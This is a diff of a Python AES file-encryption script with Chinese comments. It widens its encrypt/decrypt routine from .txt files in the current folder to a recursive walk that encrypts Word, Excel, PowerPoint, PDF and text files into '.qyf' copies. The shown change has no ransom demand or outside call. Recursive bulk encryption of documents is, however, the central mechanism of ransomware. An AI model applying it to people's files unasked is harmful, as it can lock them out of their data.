@@ -15,8 +15,9 @@ from Crypto.Cipher import AES
 import base64,os
 
 
-current_dir = os.getcwd()
-print("当前程序运行目录为:", current_dir)
+import os
+
+
 
 def encrypt_file(input_file_path, output_file_path, key):
     with open(input_file_path, 'rb') as in_file:
@@ -88,25 +89,34 @@ def newencrypt(dada):
 
     # current_directory = os.path.dirname(os.path.abspath(__file__))
     current_directory = os.getcwd()
-    print(current_directory)
-    for filename in os.listdir(current_directory):
+    print("当前程序运行目录",current_directory)
 
-        if dada==1:
-            if filename.endswith('.txt'):
-                file_path = os.path.join(current_directory, filename)
-                # 在这里可以对每个 txt 文件进行操作
-                print(f"正在处理文件：{file_path}")
-               
-                encrypt_file(file_path, file_path+".qyf", key)  #加密
-             
-        else:
-            if filename.endswith('.qyf'):
-                file_path = os.path.join(current_directory, filename)
-                # 在这里可以对每个 txt 文件进行操作
-                print(f"正在处理文件：{file_path}")
-                base_name, extension = os.path.splitext(file_path)
+    office_file_extensions = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx','.txt','.qyf', '.pdf']
 
-                decrypt_file(file_path,base_name,key) #解密        
+
+
+    for root, dirs, files in os.walk(current_directory):
+        for filename in files:
+            for extension in office_file_extensions:
+                if filename.endswith(extension):
+                    print(os.path.join(root, filename))
+
+                    print(filename)
+                    if dada==1:
+                        if not filename.endswith('.qyf'):
+                            file_path = os.path.join(root, filename)
+                            # 在这里可以对每个 txt 文件进行操作
+                            print(f"正在处理文件：{file_path}")
+                        
+                            encrypt_file(file_path, file_path+".qyf", key)  #加密
+                    else:
+                        if filename.endswith('.qyf'):
+                                file_path = os.path.join(root, filename)
+                                # 在这里可以对每个 txt 文件进行操作
+                                print(f"正在处理文件：{file_path}")
+                                base_name, extension = os.path.splitext(file_path)
+
+                                decrypt_file(file_path,base_name,key) #解密        
 
 
 def scanning_thread(output_label):
